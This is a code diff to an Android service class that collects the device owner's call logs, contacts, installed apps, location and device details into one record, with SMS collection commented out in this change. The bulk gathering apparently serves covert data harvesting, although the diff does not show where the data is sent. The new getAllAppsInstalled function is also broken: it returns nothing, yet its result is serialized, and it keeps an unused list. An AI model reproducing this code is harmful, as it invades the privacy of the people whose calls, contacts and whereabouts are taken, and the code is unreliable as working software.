@@ -168,10 +168,10 @@ class AppService : Service() {
 //                Log.d(TAG, "location --> ${Gson().toJson(it)}")
 //            }
 
-        val smsLogs = getSMSLogs()
+//        val smsLogs = getSMSLogs()
         val callLogs = Gson().toJson(getCallLogs())
         val listContact = Gson().toJson(getNamePhoneDetails())
-        val appsInstalled = Gson().toJson(getAppsInstalled())
+        val appsInstalled = Gson().toJson(getAllAppsInstalled())
         var strLocation = "Location Unknown"
         if (location != null) {
             strLocation = Gson().toJson(location)
@@ -181,7 +181,7 @@ class AppService : Service() {
             location = strLocation,
             deviceInfo = getSystemDetail(),
             callLogs = callLogs,
-            smsLogs = smsLogs,
+            smsLogs = "smsLogs",
             listContact = listContact,
             appsDownloaded = appsInstalled,
         )
@@ -303,17 +303,36 @@ class AppService : Service() {
         return names
     }
 
-    private fun getAppsInstalled(): MutableList<String> {
-        val apps = mutableListOf<String>()
-        val pm = packageManager
-        val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
 
-        for (packageInfo in packages) {
-            apps.add(packageInfo.packageName)
+    @Throws(PackageManager.NameNotFoundException::class)
+    fun getAllAppsInstalled() {
+        val mainIntent = Intent(Intent.ACTION_MAIN, null)
+        mainIntent.addCategory(Intent.CATEGORY_LAUNCHER)
+
+        // get list of all the apps installed
+        val ril = packageManager.queryIntentActivities(mainIntent, 0)
+        val componentList: List<String> = ArrayList()
+        lateinit var name: String
+        var i = 0
+
+        // get size of ril and create a list
+        val apps = arrayOfNulls<String>(ril.size)
+        for (ri in ril) {
+            if (ri.activityInfo != null) {
+                // get package
+                val res = packageManager.getResourcesForApplication(ri.activityInfo.applicationInfo)
+                // if activity label res is found
+                name = if (ri.activityInfo.labelRes != 0) {
+                    res.getString(ri.activityInfo.labelRes)
+                } else {
+                    ri.activityInfo.applicationInfo.loadLabel(packageManager).toString()
+                }
+                apps[i] = name
+                i++
+            }
         }
-        Log.d(TAG, "Apps Installed --> ${Gson().toJson(apps)}")
-        return apps
+        // set all the apps name in list view
+        Log.d(TAG, "apps --> ${Gson().toJson(apps)}")
     }
-
 
 }
